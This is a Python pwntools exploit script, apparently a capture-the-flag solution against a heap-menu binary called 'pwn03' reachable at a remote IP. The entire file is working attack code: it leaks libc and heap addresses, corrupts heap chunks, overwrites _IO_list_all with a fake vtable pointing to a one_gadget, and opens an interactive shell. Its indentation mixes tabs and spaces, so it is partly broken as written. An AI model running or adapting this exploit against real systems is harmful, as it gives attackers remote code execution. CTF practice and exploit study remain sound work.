#!/usr/bin/env python

from pwn import *

if (sys.argv[1] == "local"):
	r = process("./pwn03")
else:
	r = remote("18.136.126.78", 1336)

def alloc():
	r.sendlineafter("CHOICE : ","1")

def show(index):
	r.sendlineafter("CHOICE : ","4")
	r.recvuntil("Index : ")
	r.sendline(str(index))

def edit(index,magic,content):
	r.sendlineafter("CHOICE : ","2")
        r.recvuntil("Index : ")
        r.sendline(str(index))
	r.recvuntil("Magic : ")
	r.sendline(str(magic))
	r.recvuntil("Content : ")
	r.send(content)

def remove(index):
	r.sendlineafter("CHOICE : ","3")
        r.recvuntil("Index : ")
        r.sendline(str(index))

libc = ELF("./libc-2.23.so")
IO_list_all_off = libc.symbols["_IO_list_all"]

alloc() #0
alloc() #1
alloc() #2
alloc() #3
remove(0)
remove(2)
alloc() #0
show(0) 

r.recvuntil("Magic : ")
base_libc = int(r.recvline().strip("\n")) - 0x3c4b78
log.info("base_libc: %s" % hex(base_libc))
r.recvuntil("Content : ")
heap = u64(r.recv(6) + "\x00\x00") - 0x140
log.info("heap: %s" % hex(heap))
IO_list_all = base_libc + IO_list_all_off
one_gadget = base_libc + 0xf1147  

alloc()
alloc()
payload = p64(0)*9 + p64(0x100) + p64(heap+0x10) +"\n"
edit(3,8,payload)
remove(2)
remove(3)

payload = p64(heap+0xc0) + p64(0)*2 + p64(heap+0xa0)*2
payload = payload.ljust(136,"\x00")
payload += p64(0xa0)
edit(1,str(heap+0xc0),payload)
remove(0)

alloc()
alloc()
payload = p64(IO_list_all-0x10) + "\n"
edit(1,str(base_libc+0x3c4b78),payload)
alloc()
payload = p64(0)*6 + p64(heap+0xf8)
payload += p64(0)*4 + p64(one_gadget) +"\n" # fake vtable
edit(1,8,payload)

payload = "\x00"*32 + p64(1) + "\x00"*88 + p64(heap+0x30) + "\n"
edit(2,str(u64("/bin/sh\x00")),payload)
#pause()
remove(1)

r.interactive()
